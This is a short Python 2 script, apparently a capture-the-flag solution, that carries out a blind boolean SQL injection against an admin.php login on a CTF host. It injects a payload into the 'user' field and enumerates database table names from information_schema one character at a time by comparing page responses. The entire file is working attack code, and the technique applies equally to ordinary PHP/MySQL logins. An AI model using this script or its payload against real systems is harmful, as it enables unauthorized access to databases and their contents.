import urllib
import urllib2
import json


def test(user):

    password = ""
    data = urllib.urlencode({"user" : user, "password" : password}
           )

    request = urllib2.Request(url, data)
    result = urllib2.urlopen(request)
    result_string = result.read()

    return result_string

if __name__ == '__main__':

    url = "http://csie.ctf.tw:10110/admin.php"
    data = urllib.urlencode({"user":"admin", "password":"t3st"})
    request = urllib2.Request(url, data)
    result = urllib2.urlopen(request)
    result_success = result.read()

    table_names = []
    table_index = 0
    while True:
        char_index = 1
        string = ""
        while True:
            ascii_value = -1
            while True:
                user = "1' or ascii(substring( (select table_name from " + \
                       "information_schema.tables WHERE table_schema != 'mysql' " + \
                       "AND table_schema != 'information_schema' " + \
                       "LIMIT {},1), {}, 1))> {} #".format(
                            table_index, char_index, ascii_value
                       )
                result_string = test(user)
                if result_string != result_success:
                    break
                ascii_value += 1

            if ascii_value == 0:
                break
            string += chr(ascii_value)
            char_index += 1
        print string
        table_index += 1
        table_names.append(string)

